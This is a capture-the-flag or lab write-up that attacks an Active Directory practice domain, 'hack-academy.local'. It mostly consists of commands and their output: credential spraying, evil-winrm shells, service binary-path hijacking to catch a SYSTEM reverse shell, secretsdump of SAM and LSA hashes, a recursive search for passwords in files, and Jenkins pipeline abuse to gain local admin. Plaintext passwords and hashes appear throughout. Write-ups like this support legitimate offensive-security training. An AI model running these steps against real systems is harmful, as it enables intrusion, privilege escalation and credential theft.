Target and domain discovery. Only Client1 is reachable so we need to pivot later on. Add Client1 ip to ips list and add domain name to /etc/hosts
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD7]
└─$ netexec smb 192.168.101.0/24
SMB         192.168.101.117 445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

┌──(kali㉿kali)-[~/writeups/ad/AD7]
└─$ cd loot        

┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ echo 192.168.101.117 > ips                                         

┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ cat ips
192.168.101.117

┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ sudo nano /etc/hosts

```
![[Pasted image 20260817064810.png]]

nxc-sweep to test creds. We have read access to InternalApps Share
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ nxc-sweep 192.168.101.117 -u eturner -p 'Ya-Boy14' 
[*] Starting NXC sweep for 192.168.101.117 as eturner ...

[+] Port 445 open. Checking smb ...                                                                                                                                                                                
SMB         192.168.101.117 445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)                                          
SMB         192.168.101.117 445    CLIENT-1         [+] hack-academy.local\eturner:Ya-Boy14 
SMB         192.168.101.117 445    CLIENT-1         [*] Enumerated shares
SMB         192.168.101.117 445    CLIENT-1         Share           Permissions     Remark
SMB         192.168.101.117 445    CLIENT-1         -----           -----------     ------
SMB         192.168.101.117 445    CLIENT-1         ADMIN$                          Remote Admin
SMB         192.168.101.117 445    CLIENT-1         C$                              Default share
SMB         192.168.101.117 445    CLIENT-1         InternalApps    READ            
SMB         192.168.101.117 445    CLIENT-1         IPC$            READ            Remote IPC
SMB         192.168.101.117 445    CLIENT-1         IT-Support      READ    
```
![[Pasted image 20260817065005.png]]

Connected share and got deploy.ps1 script that contained user creds for svc_webapi
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ impacket-smbclient hack-academy.local/eturner:'Ya-Boy14'@192.168.101.117

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
InternalApps
IPC$
IT-Support
# use InternalApps
# tree
/deploy.ps1
/readme.txt
Finished - 0 files and folders
# get deploy.ps1
# get readme.txt
# exit
                                                                                                        
┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ ls
deploy.ps1  ips  nmap.txt  readme.txt
                                                                                                        
┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ cat deploy.ps1 
# WebAPI Deployment Script
# Deploys the internal WebAPI service on CLIENT-1
# Last modified: 2024-08-19

$DeployUser = "hack-academy\svc_webapi"
$DeployPass = "Andrew,3"
$ServicePath = "C:\Services\WebAPI"
$ServiceName = "WebAPIService"

$SecurePass = ConvertTo-SecureString $DeployPass -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential($DeployUser, $SecurePass)

Write-Host "[*] Deploying WebAPI service as $DeployUser..."
Copy-Item "\\FILESERV01\deploy\webapi-svc.exe" -Destination $ServicePath -Credential $Cred
sc.exe start $ServiceName
Write-Host "[+] WebAPI deployment complete."

```
![[Pasted image 20260817065451.png]]

spray the creds and we have winrm PWND as svc_webapi
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ netexec winrm ips -u usernames -p passwords --continue-on-success

WINRM       192.168.101.117 5985   CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-1) (domain:hack-academy.local) 
WINRM       192.168.101.117 5985   CLIENT-1         [-] hack-academy.local\eturner:Ya-Boy14
WINRM       192.168.101.117 5985   CLIENT-1         [-] hack-academy.local\svc_webapi:Ya-Boy14
WINRM       192.168.101.117 5985   CLIENT-1         [-] hack-academy.local\eturner:Andrew,3
WINRM       192.168.101.117 5985   CLIENT-1         [+] hack-academy.local\svc_webapi:Andrew,3 (Pwn3d!)
```
![[Pasted image 20260817065645.png]]

got shell
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ evil-winrm -u svc_webapi -p 'Andrew,3' -i 192.168.101.117
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_webapi\Documents> whoami
hack-academy\svc_webapi
*Evil-WinRM* PS C:\Users\svc_webapi\Documents> hostname
CLIENT-1
```
![[Pasted image 20260817065943.png]]

checked privs but nothing interesting. Start with setting up ligolo for pivoting

okay I setup ligolo with instructions
https://ph03n1x.net/ligolo-cheatsheet/

and test connection. We reach internal network
``` sh
┌──(kali㉿kali)-[~/pivot]
└─$ netexec smb 10.0.2.0/24                                     

SMB         10.0.2.26       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.1        445    DESKTOP-CIVQJ2K  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CIVQJ2K) (domain:DESKTOP-CIVQJ2K) (signing:True) (SMBv1:None)
SMB         10.0.2.27       445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.100      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)

```
![[Pasted image 20260817073002.png]]

add these to ips list and update /etc/hosts

Collect bloodhound data for starters

``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ bloodhound-python -u "eturner" -p 'Ya-Boy14' -d hack-academy.local -c all --zip -ns 10.0.2.100
 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: hack-academy.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.hack-academy.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.hack-academy.local
INFO: Found 12 users
INFO: Found 52 groups
INFO: Found 6 gpos
INFO: Found 4 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: CLIENT-2.hack-academy.local
INFO: Querying computer: CLIENT-1.hack-academy.local
INFO: Querying computer: DC01.hack-academy.local
INFO: Done in 00M 01S
INFO: Compressing output into 20260817003447_bloodhound.zip

```
![[Pasted image 20260817073533.png]]


Before kerberoast lets get usernames list.
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ netexec ldap 10.0.2.100 -u svc_webapi -p 'Andrew,3' --users

LDAP        10.0.2.100      389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hack-academy.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.0.2.100      389    DC01             [+] hack-academy.local\svc_webapi:Andrew,3 
LDAP        10.0.2.100      389    DC01             [*] Enumerated 11 domain users: hack-academy.local
LDAP        10.0.2.100      389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                                                                    
LDAP        10.0.2.100      389    DC01             Administrator                 2026-04-13 03:11:11 0        Built-in account for administering the computer/domain                                           
LDAP        10.0.2.100      389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain                                         
LDAP        10.0.2.100      389    DC01             krbtgt                        2026-04-13 03:29:30 0        Key Distribution Center Service Account                                                          
LDAP        10.0.2.100      389    DC01             svc_webapi                    2026-04-13 03:45:06 0        WebAPI deployment account                                                                        
LDAP        10.0.2.100      389    DC01             svc_admin                     2026-04-13 03:45:06 0        Backup and sync service account                                                                  
LDAP        10.0.2.100      389    DC01             svc_reports                   2026-04-13 03:45:06 0        Reporting service - read-only dashboard access                                                   
LDAP        10.0.2.100      389    DC01             svc_legacy                    2026-04-13 03:45:06 0        DEPRECATED - migrated to new platform                                                            
LDAP        10.0.2.100      389    DC01             svc_monitor                   2026-04-13 03:45:06 0        Monitoring service - temp pwd: Memorex| - RESET REQUIRED                                         
LDAP        10.0.2.100      389    DC01             svc_update                    2026-04-13 03:45:06 0        DEPRECATED -- replaced by SCCM                                                                   
LDAP        10.0.2.100      389    DC01             eturner                       2026-04-13 03:46:41 1                                                                                                         
LDAP        10.0.2.100      389    DC01             kpatel                        2026-04-13 03:46:41 0                                                                                                         

```
![[Pasted image 20260817074934.png]]

Lets try privesc on Client1

privescCheck.ps1
``` sh
Name              : WebAPIService
DisplayName       : Web API Service
User              : LocalSystem
ImagePath         : C:\Services\WebAPI\webapi-svc.exe
StartMode         : Manual
Type              : Win32OwnProcess
RegistryKey       : HKLM\SYSTEM\CurrentControlSet\Services
RegistryPath      : HKLM\SYSTEM\CurrentControlSet\Services\WebAPIService
Status            : Stopped
UserCanStart      : False
UserCanStop       : False
IdentityReference : HACK-ACADEMY\svc_webapi (S-1-5-21-1006770658-2633334449-451426994-1103)
Permissions       : AllAccess



[*] Status: Vulnerable - Severity: High - Execution time: 00:00:10.489

```

Lets make a payload and replace the execuable path to our exploit
``` sh
*Evil-WinRM* PS C:\Users\svc_webapi\Documents> move .\shell.exe "C:\Windows\tasks\shell.exe"
*Evil-WinRM* PS C:\Users\svc_webapi\Documents> sc.exe config WebAPIService binpath= "C:\Windows\tasks\shell.exe"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc_webapi\Documents> sc.exe query WebAPIService

SERVICE_NAME: WebAPIService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\svc_webapi\Documents> sc.exe qc WebAPIService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: WebAPIService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\tasks\shell.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Web API Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
*Evil-WinRM* PS C:\Users\svc_webapi\Documents> start 

                                        
Warning: Press "y" to exit, press any other key to continue
*Evil-WinRM* PS C:\Users\svc_webapi\Documents> start WebAPIService
This command cannot be run due to the error: The system cannot find the file specified.
At line:1 char:1
+ start WebAPIService
+ ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException
    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand
*Evil-WinRM* PS C:\Users\svc_webapi\Documents> sc.exe start WebAPIService
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```
![[Pasted image 20260817090427.png]]

and we catch a shell as system
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD7/exploit]
└─$ penelope -p 443
[+] Listening for reverse shells on 0.0.0.0:443 -> 127.0.0.1 • 192.168.101.112 • 172.18.0.1 • 172.17.0.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => CLIENT-1 192.168.101.117 Microsoft_Windows_10_Pro-x64-based_PC 👤 nt authority\system 😍️ Session ID <1>
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/kali/.penelope/sessions/CLIENT-1~192.168.101.117-Microsoft_Windows_10_Pro-x64-based_PC/2026_08_17-02_03_39-346-nt authority\system.log
────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>hostname
hostname
CLIENT-1

C:\Windows\system32>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . : 
   IPv6 Address. . . . . . . . . . . : 2001:14ba:9c27:3600::100
   IPv6 Address. . . . . . . . . . . : 2001:14ba:9c27:3600:50bf:7134:b08d:dd6a
   Temporary IPv6 Address. . . . . . : 2001:14ba:9c27:3600:9423:12d:420c:527b
   Link-local IPv6 Address . . . . . : fe80::daec:b011:370e:c685%7
   IPv4 Address. . . . . . . . . . . : 192.168.101.117
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::e690:2aff:fe9e:21e5%7
                                       192.168.101.1

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::61a0:252f:2a51:cf5e%6
   IPv4 Address. . . . . . . . . . . : 10.0.2.26
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.0.2.1

```
![[Pasted image 20260817090453.png]]

add svc_webapi to admin group
``` sh
C:\Windows\system32>net localgroup "Administrators" svc_webapi /add
net localgroup "Administrators" svc_webapi /add
The command completed successfully.

```
![[Pasted image 20260817090554.png]]

secrets dump
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD7/exploit]
└─$ impacket-secretsdump svc_webapi@10.0.2.26

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x8917cbf9d2f62190e036f52f184ed163
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:ecf68f23a9992e7ba23750a976e96772:::
Nick:1001:aad3b435b51404eeaad3b435b51404ee:e618ab47ea4179bb6199a16daff38b5b:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
HACK-ACADEMY\CLIENT-1$:aes256-cts-hmac-sha1-96:e4a41278ea6c9ff001ee2d1e46c94dec10e76185c5b7f23c73f19dddf0a9125e
HACK-ACADEMY\CLIENT-1$:aes128-cts-hmac-sha1-96:81e03e27d53d26f09298084a3c413ff6
HACK-ACADEMY\CLIENT-1$:des-cbc-md5:8a08ce9b49985e2a
HACK-ACADEMY\CLIENT-1$:plain_password_hex:e01793c6669785d1dbe7e3e1c64b2d767a0087f3122078f6eab2f62c548682b09c40209afd8a4864e342d380cb2f3ab95d6f17d622895083c3ac6112b908538550f529aae6bf617888a3ae30405dd70dba361d1b1d50244f33c5c6120c87be1ee330222265840582a9b370360226b9fcb584ecd95cdd0a7f51b2c750e7870912cc03dbffbbc83b8c0bd5126af5f544def1e2f8f4befac18e2353d91eaf6f447ae80bf201da7c977e469643de1e60ec291d5f972a67e17bfef7d5e4f795940e3d33cd4ace64d727482631b4ebe5baa3589da301070439f7b16c4dfc206db1db6eead05326858ac8620842bcb8ed242dfa
HACK-ACADEMY\CLIENT-1$:aad3b435b51404eeaad3b435b51404ee:0c5d1e91e3d778d13d0577aff791f6ac:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x8a836084595a1cdccb27c1fbf1d5d1c0c0fd0b3e
dpapi_userkey:0x69cc7b17acf852314a2fa10b5572333ef3fd9d61
[*] NL$KM 
 0000   8B EB CE C0 D9 91 9D 92  F4 C1 0D 90 DF 3A 9A C6   .............:..
 0010   14 AF 09 75 A0 91 30 F9  DF 4A CE C4 A4 03 30 BB   ...u..0..J....0.
 0020   A1 25 A1 65 11 CC C9 90  61 69 A0 5B E6 BF BC 54   .%.e....ai.[...T
 0030   39 EF 01 C3 E5 75 6C 3E  63 EA 14 01 D5 50 67 95   9....ul>c....Pg.
NL$KM:8bebcec0d9919d92f4c10d90df3a9ac614af0975a09130f9df4acec4a40330bba125a16511ccc9906169a05be6bfbc5439ef01c3e5756c3e63ea1401d5506795
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```
![[Pasted image 20260817090652.png]]

credential harvest
``` c
*Evil-WinRM* PS C:\Users\svc_webapi\Documents> Get-ChildItem -Path C:\ -Recurse -Force -Include *.config,*.txt,*.ini,*.xml,*.bak,*.ps1,*.log,*.json,*.yml,*.env,*.cs,*.vb,*.key,*.pem,*.rdp,*.kdbx -File  -ErrorAction SilentlyContinue | Where-Object { $_FullName -notmatch '(C:\\Windows)' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass=", "kpatel"

<REDACTED>

C:\Services\WebConfig\appsettings.json:4:    "ServiceUser": "hack-academy\\kpatel",


```

Found kpatel creds
``` sh
*Evil-WinRM* PS C:\Users\svc_webapi\Documents> cat "C:\Services\WebConfig\appsettings.json"
{
  "AppSync": {
    "TargetServer": "CLIENT-2",
    "ServiceUser": "hack-academy\\kpatel",
    "ServicePassword": "100%Mary",
    "Endpoint": "http://CLIENT-2:8080/api/sync",
    "Notes": "Jenkins API on CLIENT-2 - internal only, bound to localhost"
  },
  "Logging": {
    "LogLevel": "Warning",
    "LogPath": "C:\\Services\\WebAPI\\logs\\webapi.log"
  }
}

```
![[Pasted image 20260817100658.png]]

Test the creds. We have winrm on Client2
``` sh
┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ nxc-sweep 10.0.2.27 -u kpatel -p '100%Mary'
[*] Starting NXC sweep for 10.0.2.27 as kpatel ...

[+] Port 445 open. Checking smb ...
SMB         10.0.2.27       445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.27       445    CLIENT-2         [+] hack-academy.local\kpatel:100%Mary 
SMB         10.0.2.27       445    CLIENT-2         [*] Enumerated shares
SMB         10.0.2.27       445    CLIENT-2         Share           Permissions     Remark
SMB         10.0.2.27       445    CLIENT-2         -----           -----------     ------
SMB         10.0.2.27       445    CLIENT-2         ADMIN$                          Remote Admin
SMB         10.0.2.27       445    CLIENT-2         Backup-Scripts  READ            
SMB         10.0.2.27       445    CLIENT-2         C$                              Default share
SMB         10.0.2.27       445    CLIENT-2         IPC$            READ            Remote IPC

[+] Port 5985 open. Checking winrm ...
WINRM       10.0.2.27       5985   CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 (name:CLIENT-2) (domain:hack-academy.local) 
WINRM       10.0.2.27       5985   CLIENT-2         [+] hack-academy.local\kpatel:100%Mary (Pwn3d!)

```
![[Pasted image 20260817100908.png]]

```sh
*Evil-WinRM* PS C:\Users\kpatel\Documents> whoami
hack-academy\kpatel
*Evil-WinRM* PS C:\Users\kpatel\Documents> hostname
CLIENT-2
```
![[Pasted image 20260817101053.png]]

noticed that there is something running locally on port 8080
``` sh
*Evil-WinRM* PS C:\Users\kpatel\Documents> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       876
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       1036
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       492
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1084
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       368
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1220
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       656
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       636
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       1824
  TCP    10.0.2.27:139          0.0.0.0:0              LISTENING       4
  TCP    10.0.2.27:5985         10.0.2.26:50899        TIME_WAIT       0
  TCP    10.0.2.27:5985         10.0.2.26:50910        ESTABLISHED     4
  TCP    10.0.2.27:57823        10.0.2.100:49668       TIME_WAIT       0
  TCP    10.0.2.27:57824        10.0.2.100:135         TIME_WAIT       0
  TCP    10.0.2.27:57825        10.0.2.100:49668       TIME_WAIT       0
  TCP    10.0.2.27:57826        10.0.2.100:135         TIME_WAIT       0
  TCP    10.0.2.27:57827        10.0.2.100:49668       TIME_WAIT       0
  TCP    10.0.2.27:57828        10.0.2.100:49668       TIME_WAIT       0
  TCP    10.0.2.27:57829        10.0.2.100:49668       ESTABLISHED     656
  TCP    127.0.0.1:8080         0.0.0.0:0              LISTENING       2768

```
![[Pasted image 20260817101436.png]]

we need to port forward it somehow...

Did port forward following instructions [[Port Forwarding]]
and was able to access jenkins localhost:8080
![[Pasted image 20260817111644.png]]

Read the admin password on client2
``` sh
*Evil-WinRM* PS C:\Users\kpatel\Documents> cat "C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword"
495b5b02d07e418e8ef8ea31db16f893

```
![[Pasted image 20260817111720.png]]

after that create pipeline and add batch script. Add user to admin group
![[Pasted image 20260817112445.png]]


and execute pipeline
![[Pasted image 20260817112436.png]]

test admin access. Confirmed
![[Pasted image 20260817112615.png]]

Found BackupSync.ps1
``` sh
*Evil-WinRM* PS C:\Scripts> cat BackupSync.ps1
# BackupSync - Syncs finance data to DC backup share
# Runs nightly at 2:00 AM via scheduled task
# Maintained by IT Operations

$Username = "hack-academy\svc_admin"
$Password = "-Berlin-"
$SecurePass = ConvertTo-SecureString $Password -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential($Username, $SecurePass)

$SourcePath = "C:\Finance\Reports"
$DestPath   = "\\DC01\FinanceBackup"

try {
    Copy-Item -Path $SourcePath -Destination $DestPath -Recurse -Force -Credential $Cred
    Write-EventLog -LogName Application -Source "BackupSync" -EventId 1001 -EntryType Information -Message "Backup completed successfully."
} catch {
    Write-EventLog -LogName Application -Source "BackupSync" -EventId 1002 -EntryType Error -Message "Backup failed: $_"
}

```

and sprayed the creds
```sh
┌──(kali㉿kali)-[~/writeups/ad/AD7/loot]
└─$ netexec smb ips -u svc_admin -p passwords 
SMB         10.0.2.26       445    CLIENT-1         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-1) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.27       445    CLIENT-2         [*] Windows 10 / Server 2019 Build 19041 x64 (name:CLIENT-2) (domain:hack-academy.local) (signing:False) (SMBv1:None)
SMB         10.0.2.100      445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack-academy.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.0.2.26       445    CLIENT-1         [-] hack-academy.local\svc_admin:Ya-Boy14 STATUS_LOGON_FAILURE 
SMB         10.0.2.26       445    CLIENT-1         [-] hack-academy.local\svc_admin:Andrew,3 STATUS_LOGON_FAILURE 
SMB         10.0.2.26       445    CLIENT-1         [-] hack-academy.local\svc_admin:Memorex| STATUS_LOGON_FAILURE 
SMB         10.0.2.26       445    CLIENT-1         [-] hack-academy.local\svc_admin:Memorex STATUS_LOGON_FAILURE 
SMB         10.0.2.26       445    CLIENT-1         [-] hack-academy.local\svc_admin:(Evista- STATUS_LOGON_FAILURE 
SMB         10.0.2.26       445    CLIENT-1         [+] hack-academy.local\svc_admin:-Berlin- (Pwn3d!)

```

![[Pasted image 20260817113913.png]]

we are admin
